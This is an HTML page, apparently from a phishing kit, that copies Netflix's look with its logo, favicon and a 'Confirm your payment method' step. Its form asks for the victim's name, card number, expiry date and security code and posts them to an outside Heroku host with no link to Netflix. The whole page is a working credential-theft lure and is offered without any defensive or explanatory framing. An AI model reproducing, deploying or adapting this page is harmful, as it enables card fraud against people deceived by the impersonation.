<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="step1.css">
  <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">

	<title>Netflix</title>
</head>
<body>
	<div class="navegacion">
    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fyetiograch.pl%2Fwp-content%2Fuploads%2F2016%2F01%2FNetflix-Logo.png&f=1&nofb=1" alt="">
	<form action="https://creditoburoo.herokuapp.com/cardd-en.php" method="post">
    <div class="fadeInAnim mike" >
      <div class="step">
      	<div class="alineacion">
        <div class="stepID" style="text-align: center;">STEP <b>2</b> OF <b>2</b></div>
        <h1 style="text-align: center;">Confirm your payment method.</h1>
        <div class="form">
          <div class="inputpack">
            <input type="text" id="firstnamecard" spellcheck="false" name="one" placeholder="Name" autocomplete="off"/>
            
          </div>
          <div class="error" id="firstnameErrorCard"></div>
          <div class="inputpack">
            <input type="text" id="lastnamecard" spellcheck="false" name="lastnamecard" autocomplete="off" placeholder="Lastname" />
          </div>
          <div class="error" id="lastnameErrorCard"></div>
          <div class="inputpack">
            <input type="text" maxlength="16" id="cardnumber" spellcheck="false" autocomplete="off" name="cardnumber" placeholder="Card number" />
          </div>
          <div class="error" id="cardnumberError"></div>
          <div class="inputpack">
            <input type="number" id="expdate" spellcheck="false" autocomplete="off" name="expdate" maxlength="7" placeholder="Expiration Date (MM/YY)" />
          </div>
          <div class="error" id="expError"></div>
          <div class="inputpack">
            <input type="text" id="scv" maxlength="3" spellcheck="false" autocomplete="off" maxlength="4" placeholder="Security code" name="scv" />
          </div>
          <div class="error" id="scvError"></div>
          <button id="submit_btn_card"><div id="content_card" style="">CONFIRM PAYMENT UPDATE
            </div>
            <div id="loading_card" class="btn btn-default ld-ext-middle running" style="font-size : 1.5em; margin-top : 2px; display: none;">
              <div class="ld ld-ring ld-cycle running"></div>
            </div>
          </button>
          <div class="lenguaje_la">
            <a href="#">Ingles</a>
            <i class="fas fa-caret-down"></i>
          </div>
          <style>
            .lenguaje_la {
              margin-top: 20px;
  background-color: rgba(0,0,0,0.2);
    background-image: none;
    border: 1px solid #333;
    padding-left: 10px;
    padding-top: 10px;
    padding-bottom: 10px;
    width: 90px;
}
.lenguaje_la a {
  text-decoration: none;
  color: #000;
}
          </style>
        </div>
    </div>
      </div>
    </div>
    </form>
</body>
</html>
